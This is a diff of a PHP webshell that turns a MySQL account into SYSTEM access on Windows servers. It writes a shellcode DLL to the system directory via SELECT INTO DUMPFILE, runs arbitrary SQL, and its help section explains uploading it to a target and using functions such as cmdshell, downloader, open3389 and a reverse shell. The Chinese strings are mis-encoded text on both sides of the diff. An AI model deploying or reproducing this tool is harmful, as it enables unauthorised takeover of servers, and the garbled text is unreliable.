@@ -5,7 +5,7 @@ session_start();
 ?>
 <html>
 	<head>
-		<title>langouster_udf.dll ×¨ÓÃÍøÂí</title>
+		<title>langouster_udf.dll ä¸“ç”¨ç½‘é©¬</title>
 	</head>
 	<body>
 <?php
@@ -14,7 +14,7 @@ if(!empty($_GET['action']) && $_GET['action']=='help')
 	mysql_help();
 
 
-//-----------------------------------------------------------------------------------ÆðÊ¼ÊäÈë
+//-----------------------------------------------------------------------------------èµ·å§‹è¾“å…¥
 if(empty($_GET['action']))
 {
 
@@ -22,16 +22,16 @@ if(empty($_GET['action']))
 	<form action="?action=connect" method=POST>
 		<table>
 		<tr><td>host:</td><td><input type="text" name="host" size="30"></td></tr>
-		<tr><td>mysqlÕËºÅ:</td><td><input type="text" name="username" size="30"></td></tr>
-		<tr><td>ÃÜÂë:</td><td><input type="text" name="password" size="30"></td></tr>
-		<tr><td>Êý¾Ý¿âÃû:</td><td><input type="text" name="dbname" size="30"></td></tr>
-		<tr><td>&nbsp;</td><td><input type="submit" name="submit" value="Ìá½»">&nbsp;&nbsp;&nbsp;<input type="reset" name="reset" value="ÖØÌî"></td></tr>
+		<tr><td>mysqlè´¦å·:</td><td><input type="text" name="username" size="30"></td></tr>
+		<tr><td>å¯†ç :</td><td><input type="text" name="password" size="30"></td></tr>
+		<tr><td>æ•°æ®åº“å:</td><td><input type="text" name="dbname" size="30"></td></tr>
+		<tr><td>&nbsp;</td><td><input type="submit" name="submit" value="æäº¤">&nbsp;&nbsp;&nbsp;<input type="reset" name="reset" value="é‡å¡«"></td></tr>
 	</form>
 <?php
 	exit;
 }
 
-if(!empty($_GET['action']))//Á¬½Ómysql
+if(!empty($_GET['action']))//è¿žæŽ¥mysql
 {
 	if(!empty($_POST['host']))
 		$_SESSION['host']=$_POST['host'];
@@ -46,22 +46,22 @@ if(!empty($_GET['action']))//Á¬½Ómysql
 	if(!$dbconn)
 	{
 		$_SESSION['host']=$_SESSION['username']=$_SESSION['password']=$_SESSION['dbname']='';
-		die('Êý¾Ý¿âÁ¬½áÊ§°Ü£¬Çë¼ì²éÕËºÅÐÅÏ¢¡£'. mysql_error().' &nbsp;<a href="javascript:history.back()">·µ»ØÖØÌî</a>' );
+		die('æ•°æ®åº“è¿žç»“å¤±è´¥ï¼Œè¯·æ£€æŸ¥è´¦å·ä¿¡æ¯ã€‚'. mysql_error().' &nbsp;<a href="javascript:history.back()">è¿”å›žé‡å¡«</a>' );
 	}
 	else
-		echo 'MYSQLÁ¬½á³É¹¦<br><br>';
-	//Ñ¡ÔñÊý¾Ý¿â
+		echo 'MYSQLè¿žç»“æˆåŠŸ<br><br>';
+	//é€‰æ‹©æ•°æ®åº“
 	@mysql_select_db($_SESSION['dbname']);
 	$err = mysql_error(); 
 	if($err) 
 	{
-		echo 'ÇÐ»»Êý¾Ý¿â³ö´í£¬Çë¼ì²éÊý¾Ý¿â'.$_SESSION['dbname'].'ÊÇ·ñ´æÔÚ¡£'.$err.'&nbsp;<a href="javascript:history.back()">·µ»ØÖØÌî</a>'; 
+		echo 'åˆ‡æ¢æ•°æ®åº“å‡ºé”™ï¼Œè¯·æ£€æŸ¥æ•°æ®åº“'.$_SESSION['dbname'].'æ˜¯å¦å­˜åœ¨ã€‚'.$err.'&nbsp;<a href="javascript:history.back()">è¿”å›žé‡å¡«</a>'; 
 		$_SESSION['dbname']='';
 		mysql_close($dbconn);
 		exit;
 	}
 }
-//-----------------------------------------------------------------------------------------µ¼³öDLL
+//-----------------------------------------------------------------------------------------å¯¼å‡ºDLL
 if(!empty($_POST['dllpath']) )
 	$path=stripslashes($_POST['dllpath']);
 if($path=='')
@@ -70,7 +70,7 @@ if($path=='')
 	$path="C:\\Winnt\\udf.dll";
 
 echo '<form action="?action=buildDLL&" method=POST>';
-echo	'DLLµ¼³öÂ·¾¶£º<font color="#FF0000">×¢Òâ£º</font>MYSQL 5.0ÒÔÉÏ°æ±¾ÇëÊ¹ÓÃÏµÍ³Ä¿Â¼!<br><input type="text" name="dllpath" size="40" value="'. $path.'">&nbsp;&nbsp;<input type="submit" name="submit" value="µ¼³öµ½´ËÄ¿Â¼">';
+echo	'DLLå¯¼å‡ºè·¯å¾„ï¼š<font color="#FF0000">æ³¨æ„ï¼š</font>MYSQL 5.0ä»¥ä¸Šç‰ˆæœ¬è¯·ä½¿ç”¨ç³»ç»Ÿç›®å½•!<br><input type="text" name="dllpath" size="40" value="'. $path.'">&nbsp;&nbsp;<input type="submit" name="submit" value="å¯¼å‡ºåˆ°æ­¤ç›®å½•">';
 echo '</form>';
 if(!empty($_GET['action'])&&$_GET['action']=='buildDLL')
 {
@@ -83,13 +83,13 @@ if(!empty($_GET['action'])&&$_GET['action']=='buildDLL')
 	
 	$query="CREATE TABLE Temp_Tab (udf BLOB);";
 	if(!mysql_query($query, $dbconn))
-		echo '´íÎó:´´½¨ÁÙÊ±±íTemp_Tab³ö´í¡£'.mysql_error();
+		echo 'é”™è¯¯:åˆ›å»ºä¸´æ—¶è¡¨Temp_Tabå‡ºé”™ã€‚'.mysql_error();
 	else
 	{
 		$shellcode=shellini();
 		$query="INSERT into Temp_Tab values (CONVERT($shellcode,CHAR));";
 		if(!mysql_query($query, $dbconn))
-			echo '´íÎó:²åÈëDLLÊý¾Ý³ö´í¡£'.mysql_error();
+			echo 'é”™è¯¯:æ’å…¥DLLæ•°æ®å‡ºé”™ã€‚'.mysql_error();
 		else
 		{
 			$temp=str_replace("\\\\","\\",$_SESSION['dllpath']);
@@ -97,10 +97,10 @@ if(!empty($_GET['action'])&&$_GET['action']=='buildDLL')
 			$query="SELECT udf FROM Temp_Tab INTO DUMPFILE '".$temp."';" ;
 			//echo $query;
 			if(!mysql_query($query, $dbconn))
-				echo 'µ¼³öDLLÎÄ¼þ³ö´í£º'.mysql_error();
+				echo 'å¯¼å‡ºDLLæ–‡ä»¶å‡ºé”™ï¼š'.mysql_error();
 			else
 			{
-				echo 'DLLÒÑ³É¹¦µÄµ¼³öµ½'.$_SESSION['dllpath'].'<br>';
+				echo 'DLLå·²æˆåŠŸçš„å¯¼å‡ºåˆ°'.$_SESSION['dllpath'].'<br>';
 			}
 		}
 		mysql_query('DROP TABLE Temp_Tab;', $dbconn);
@@ -109,12 +109,12 @@ if(!empty($_GET['action'])&&$_GET['action']=='buildDLL')
 			
 }
 echo '<hr><br>';
-//-----------------------------------------------------------------------------------------Ö´ÐÐSQLÓï¾ä
+//-----------------------------------------------------------------------------------------æ‰§è¡ŒSQLè¯­å¥
 if(!empty($_POST['query']))
 	$query=stripslashes($_POST['query']);
 
 echo '<form action="?action=SQL&" method=POST>';
-echo 'SQLÃüÁî:<br><input type="text" name="query" size="60" value="'. $query .'">&nbsp;&nbsp;&nbsp;<input type="submit" value="Ö´ÐÐ">';
+echo 'SQLå‘½ä»¤:<br><input type="text" name="query" size="60" value="'. $query .'">&nbsp;&nbsp;&nbsp;<input type="submit" value="æ‰§è¡Œ">';
 echo '</form>';
 
 $query=str_replace("\\\\","\\",$query);
@@ -126,14 +126,14 @@ if($query!='' && $_GET['action']=='SQL')
 	$err = mysql_error(); 
 	if($err) 
 	{
-		echo 'Êý¾Ý¿â²éÑ¶³ö´í£¬Çë¼ì²éSQLÓï¾ä'.$query.'µÄÓï·¨ÊÇ·ñÕýÈ·¡£'.mysql_error();
+		echo 'æ•°æ®åº“æŸ¥è®¯å‡ºé”™ï¼Œè¯·æ£€æŸ¥SQLè¯­å¥'.$query.'çš„è¯­æ³•æ˜¯å¦æ­£ç¡®ã€‚'.mysql_error();
 	}
 	else
 	{
-		echo '»ØÏÔ½á¹û:<br>';
+		echo 'å›žæ˜¾ç»“æžœ:<br>';
 		echo '<textarea cols="122" rows="22" wrap="soft">';
 		
-		if(strtolower(substr($query,0,6))=='select')//¼ìÑéÊÇ²»ÊÇ²éÑ¶Óï¾ä
+		if(strtolower(substr($query,0,6))=='select')//æ£€éªŒæ˜¯ä¸æ˜¯æŸ¥è®¯è¯­å¥
 		{
 			for($i=0;$i<mysql_num_fields($result);$i++)
 				echo mysql_field_name($result,$i)."\t";
@@ -150,14 +150,14 @@ if($query!='' && $_GET['action']=='SQL')
 			}
 		}
 		else
-			echo "   Ö´ÐÐ³É¹¦\r\n";
+			echo "   æ‰§è¡ŒæˆåŠŸ\r\n";
 			
 		echo '-----------------------------------';
 		echo '</textarea>';
 	}
 }
 mysql_close($dbconn);
-//-----------------------------------------------------------------------------------------µ×²¿ÐÅÏ¢
+//-----------------------------------------------------------------------------------------åº•éƒ¨ä¿¡æ¯
 
 ?>
 
@@ -183,30 +183,30 @@ function mysql_help()
 ?>
 	<br>
 	
-	Ò»¡¢¹¦ÄÜ£º<font color="#558866" size="3">ÀûÓÃMYSQLµÄCreate FunctionÓï¾ä£¬½«MYSQLÕËºÅ×ª»¯ÎªÏµÍ³systemÈ¨ÏÞ¡£</font><br><br>
+	ä¸€ã€åŠŸèƒ½ï¼š<font color="#558866" size="3">åˆ©ç”¨MYSQLçš„Create Functionè¯­å¥ï¼Œå°†MYSQLè´¦å·è½¬åŒ–ä¸ºç³»ç»Ÿsystemæƒé™ã€‚</font><br><br>
 	
-	¶þ¡¢ÊÊÓÃ³¡ºÏ£º<font color="#558866" size="3">1.Ä¿±êÏµÍ³ÊÇWindows(Win2000,XP,Win2003)£»2.ÄãÒÑ¾­ÓµÓÐMYSQLµÄÄ³¸öÓÃ»§ÕËºÅ£¬´ËÕËºÅ±ØÐëÓÐ¶ÔmysqlµÄinsertºÍdeleteÈ¨ÏÞÒÔ´´½¨ºÍÅ×Æúº¯Êý(MYSQLÎÄµµÔ­Óï)¡£</font><br><br>
+	äºŒã€é€‚ç”¨åœºåˆï¼š<font color="#558866" size="3">1.ç›®æ ‡ç³»ç»Ÿæ˜¯Windows(Win2000,XP,Win2003)ï¼›2.ä½ å·²ç»æ‹¥æœ‰MYSQLçš„æŸä¸ªç”¨æˆ·è´¦å·ï¼Œæ­¤è´¦å·å¿…é¡»æœ‰å¯¹mysqlçš„insertå’Œdeleteæƒé™ä»¥åˆ›å»ºå’ŒæŠ›å¼ƒå‡½æ•°(MYSQLæ–‡æ¡£åŽŸè¯­)ã€‚</font><br><br>
 	
-	Èý¡¢Ê¹ÓÃ°ïÖú£º<br>
+	ä¸‰ã€ä½¿ç”¨å¸®åŠ©ï¼š<br>
 	<font color="#558866" size="3">
-	&nbsp;&nbsp;&nbsp;µÚÒ»²½£º½«±¾ÎÄ¼þÉÏ´«µ½Ä¿±ê»úÉÏ£¬ÌîÈëÄãµÄMYSQLÕËºÅ¾­ÐÐÁ¬½Ó¡£<br><br>
-	&nbsp;&nbsp;&nbsp;µÚ¶þ²½£ºÁ¬½Ó³É¹¦ºó£¬µ¼³öDLLÎÄ¼þ£¬µ¼³öÊ±ÇëÎð±Ø×¢Òâµ¼³öÂ·¾¶£¨Ò»°ãÇé¿öÏÂ¶ÔÈÎºÎÄ¿Â¼¿ÉÐ´£¬ÎÞÐè¿¼ÂÇÈ¨ÏÞÎÊÌâ£©£¬¶ÔÓÚMYSQL5.0ÒÔÉÏ°æ±¾£¬Äã±ØÐë½«DLLµ¼³öµ½Ä¿±ê»úÆ÷µÄÏµÍ³Ä¿Â¼(win »ò system32)£¬·ñÔòÔÚÏÂÒ»²½²Ù×÷ÖÐÄã»á¿´µ½"No paths allowed for shared library"´íÎó¡£<br><br>
-	&nbsp;&nbsp;&nbsp;µÚÈý²½£ºÊ¹ÓÃSQLÓï¾ä´´½¨¹¦ÄÜº¯Êý¡£Óï·¨£ºCreate Function º¯ÊýÃû£¨º¯ÊýÃûÖ»ÄÜÎªÏÂÃæÁÐ±íÖÐµÄÆäÖÐÖ®Ò»£© returns string soname 'µ¼³öµÄDLLÂ·¾¶'£»¶ÔÓÚMYSQL5.0ÒÔÉÏ°æ±¾£¬Óï¾äÖÐµÄDLL²»ÔÊÐí´øÈ«Â·¾¶£¬Èç¹ûÄãÔÚµÚ¶þ²½ÖÐÒÑ½«DLLµ¼³öµ½ÏµÍ³Ä¿Â¼£¬ÄÇÃ´Äã¾Í¿ÉÒÔÊ¡ÂÔÂ·¾¶¶øÊ¹ÃüÁîÕý³£Ö´ÐÐ£¬·ñÔòÄã½«»á¿´µ½"Can't open shared library"´íÎó£¬ÕâÊ±Äã±ØÐë½«DLLÖØÐÂµ¼³öµ½ÏµÍ³Ä¿Â¼¡£   <br><br>
-	&nbsp;&nbsp;&nbsp;µÚËÄ²½£ºÕýÈ·´´½¨¹¦ÄÜº¯Êýºó£¬Äã¾Í¿ÉÒÔÓÃSQLÓï¾äÀ´Ê¹ÓÃÕâÐ©¹¦ÄÜÁË¡£Óï·¨£ºselect ´´½¨µÄº¯ÊýÃû('²ÎÊýÁÐ±í')£» Ã¿¸öº¯ÊýÓÐ²»Í¬µÄ²ÎÊý£¬Äã¿ÉÒÔÊ¹ÓÃselect ´´½¨µÄº¯ÊýÃû('help')£»À´»ñµÃÖ¸¶¨º¯ÊýµÄ²ÎÊýÁÐ±íÐÅÏ¢¡£<br><br>
-	&nbsp;&nbsp;&nbsp;µÚÎå²½£ºÊ¹ÓÃÍê³ÉºóÄã¿ÉÄÜÐèÒªÉ¾³ýÔÚµÚ¶þ²½ÖÐµ¼³öµÄDLL£¬µ«ÔÚÉ¾³ýDLLÇ°ÇëÏÈÉ¾³ýÄãÔÚµÚÈý²½ÖÐ´´½¨µÄº¯Êý£¬·ñÔòÉ¾³ý²Ù×÷½«Ê§°Ü£¬É¾³ýµÚÈý²½ÖÐ´´½¨µÄº¯ÊýµÄSQLÓï¾äÎª£ºdrop function  ´´½¨µÄº¯ÊýÃû£»<br><br>
+	&nbsp;&nbsp;&nbsp;ç¬¬ä¸€æ­¥ï¼šå°†æœ¬æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœºä¸Šï¼Œå¡«å…¥ä½ çš„MYSQLè´¦å·ç»è¡Œè¿žæŽ¥ã€‚<br><br>
+	&nbsp;&nbsp;&nbsp;ç¬¬äºŒæ­¥ï¼šè¿žæŽ¥æˆåŠŸåŽï¼Œå¯¼å‡ºDLLæ–‡ä»¶ï¼Œå¯¼å‡ºæ—¶è¯·å‹¿å¿…æ³¨æ„å¯¼å‡ºè·¯å¾„ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹å¯¹ä»»ä½•ç›®å½•å¯å†™ï¼Œæ— éœ€è€ƒè™‘æƒé™é—®é¢˜ï¼‰ï¼Œå¯¹äºŽMYSQL5.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œä½ å¿…é¡»å°†DLLå¯¼å‡ºåˆ°ç›®æ ‡æœºå™¨çš„ç³»ç»Ÿç›®å½•(win æˆ– system32)ï¼Œå¦åˆ™åœ¨ä¸‹ä¸€æ­¥æ“ä½œä¸­ä½ ä¼šçœ‹åˆ°"No paths allowed for shared library"é”™è¯¯ã€‚<br><br>
+	&nbsp;&nbsp;&nbsp;ç¬¬ä¸‰æ­¥ï¼šä½¿ç”¨SQLè¯­å¥åˆ›å»ºåŠŸèƒ½å‡½æ•°ã€‚è¯­æ³•ï¼šCreate Function å‡½æ•°åï¼ˆå‡½æ•°ååªèƒ½ä¸ºä¸‹é¢åˆ—è¡¨ä¸­çš„å…¶ä¸­ä¹‹ä¸€ï¼‰ returns string soname 'å¯¼å‡ºçš„DLLè·¯å¾„'ï¼›å¯¹äºŽMYSQL5.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œè¯­å¥ä¸­çš„DLLä¸å…è®¸å¸¦å…¨è·¯å¾„ï¼Œå¦‚æžœä½ åœ¨ç¬¬äºŒæ­¥ä¸­å·²å°†DLLå¯¼å‡ºåˆ°ç³»ç»Ÿç›®å½•ï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥çœç•¥è·¯å¾„è€Œä½¿å‘½ä»¤æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä½ å°†ä¼šçœ‹åˆ°"Can't open shared library"é”™è¯¯ï¼Œè¿™æ—¶ä½ å¿…é¡»å°†DLLé‡æ–°å¯¼å‡ºåˆ°ç³»ç»Ÿç›®å½•ã€‚   <br><br>
+	&nbsp;&nbsp;&nbsp;ç¬¬å››æ­¥ï¼šæ­£ç¡®åˆ›å»ºåŠŸèƒ½å‡½æ•°åŽï¼Œä½ å°±å¯ä»¥ç”¨SQLè¯­å¥æ¥ä½¿ç”¨è¿™äº›åŠŸèƒ½äº†ã€‚è¯­æ³•ï¼šselect åˆ›å»ºçš„å‡½æ•°å('å‚æ•°åˆ—è¡¨')ï¼› æ¯ä¸ªå‡½æ•°æœ‰ä¸åŒçš„å‚æ•°ï¼Œä½ å¯ä»¥ä½¿ç”¨select åˆ›å»ºçš„å‡½æ•°å('help')ï¼›æ¥èŽ·å¾—æŒ‡å®šå‡½æ•°çš„å‚æ•°åˆ—è¡¨ä¿¡æ¯ã€‚<br><br>
+	&nbsp;&nbsp;&nbsp;ç¬¬äº”æ­¥ï¼šä½¿ç”¨å®ŒæˆåŽä½ å¯èƒ½éœ€è¦åˆ é™¤åœ¨ç¬¬äºŒæ­¥ä¸­å¯¼å‡ºçš„DLLï¼Œä½†åœ¨åˆ é™¤DLLå‰è¯·å…ˆåˆ é™¤ä½ åœ¨ç¬¬ä¸‰æ­¥ä¸­åˆ›å»ºçš„å‡½æ•°ï¼Œå¦åˆ™åˆ é™¤æ“ä½œå°†å¤±è´¥ï¼Œåˆ é™¤ç¬¬ä¸‰æ­¥ä¸­åˆ›å»ºçš„å‡½æ•°çš„SQLè¯­å¥ä¸ºï¼šdrop function  åˆ›å»ºçš„å‡½æ•°åï¼›<br><br>
 	</font>
-	ËÄ¡¢¹¦ÄÜº¯ÊýËµÃ÷£º<br>
+	å››ã€åŠŸèƒ½å‡½æ•°è¯´æ˜Žï¼š<br>
 	<font color="#558866" size="3">
-	&nbsp;&nbsp;&nbsp;cmdshell Ö´ÐÐcmd;<br>
-	&nbsp;&nbsp;&nbsp;downloader ÏÂÔØÕß,µ½ÍøÉÏÏÂÔØÖ¸¶¨ÎÄ¼þ²¢±£´æµ½Ö¸¶¨Ä¿Â¼;<br>
-	&nbsp;&nbsp;&nbsp;open3389 Í¨ÓÃ¿ª3389ÖÕ¶Ë·þÎñ,¿ÉÖ¸¶¨¶Ë¿Ú(²»¸Ä¶Ë¿ÚÎÞÐèÖØÆô);<br>
-	&nbsp;&nbsp;&nbsp;backshell ·´µ¯Shell;<br>
-	&nbsp;&nbsp;&nbsp;ProcessView Ã¶¾ÙÏµÍ³½ø³Ì;<br>
-	&nbsp;&nbsp;&nbsp;KillProcess  ÖÕÖ¹Ö¸¶¨½ø³Ì;<br>
-	&nbsp;&nbsp;&nbsp;regread ¶Á×¢²á±í;<br>
-	&nbsp;&nbsp;&nbsp;regwrite Ð´×¢²á±í;<br>
-	&nbsp;&nbsp;&nbsp;shut ¹Ø»ú,×¢Ïú,ÖØÆô;<br>
-	&nbsp;&nbsp;&nbsp;about ËµÃ÷Óë°ïÖúº¯Êý;<br>
+	&nbsp;&nbsp;&nbsp;cmdshell æ‰§è¡Œcmd;<br>
+	&nbsp;&nbsp;&nbsp;downloader ä¸‹è½½è€…,åˆ°ç½‘ä¸Šä¸‹è½½æŒ‡å®šæ–‡ä»¶å¹¶ä¿å­˜åˆ°æŒ‡å®šç›®å½•;<br>
+	&nbsp;&nbsp;&nbsp;open3389 é€šç”¨å¼€3389ç»ˆç«¯æœåŠ¡,å¯æŒ‡å®šç«¯å£(ä¸æ”¹ç«¯å£æ— éœ€é‡å¯);<br>
+	&nbsp;&nbsp;&nbsp;backshell åå¼¹Shell;<br>
+	&nbsp;&nbsp;&nbsp;ProcessView æžšä¸¾ç³»ç»Ÿè¿›ç¨‹;<br>
+	&nbsp;&nbsp;&nbsp;KillProcess  ç»ˆæ­¢æŒ‡å®šè¿›ç¨‹;<br>
+	&nbsp;&nbsp;&nbsp;regread è¯»æ³¨å†Œè¡¨;<br>
+	&nbsp;&nbsp;&nbsp;regwrite å†™æ³¨å†Œè¡¨;<br>
+	&nbsp;&nbsp;&nbsp;shut å…³æœº,æ³¨é”€,é‡å¯;<br>
+	&nbsp;&nbsp;&nbsp;about è¯´æ˜Žä¸Žå¸®åŠ©å‡½æ•°;<br>
 	</font>
 	
 <?	
